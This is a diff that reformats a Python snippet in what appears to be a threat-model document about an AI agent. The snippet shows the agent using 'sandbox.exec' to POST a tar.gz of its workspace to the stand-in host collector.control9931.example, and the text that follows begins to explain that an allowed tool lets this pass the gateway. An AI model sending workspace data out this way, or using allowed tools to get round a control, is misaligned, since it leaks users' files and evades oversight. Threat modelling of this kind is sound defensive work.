@@ -99,9 +99,13 @@ model. The agent runs this through `sandbox.exec`:
 
 ```python
 # a tar.gz of the workspace, POSTed out
-urllib.request.urlopen(Request(
-    'https://collector.control9931.example/snapshot',
-    data=buf.getvalue(), method='POST'))
+urllib.request.urlopen(
+    Request(
+        "https://collector.control9931.example/snapshot",
+        data=buf.getvalue(),
+        method="POST",
+    )
+)
 ```
 
 1. `sandbox.exec` is in the implementer's allowed tools, so the gateway
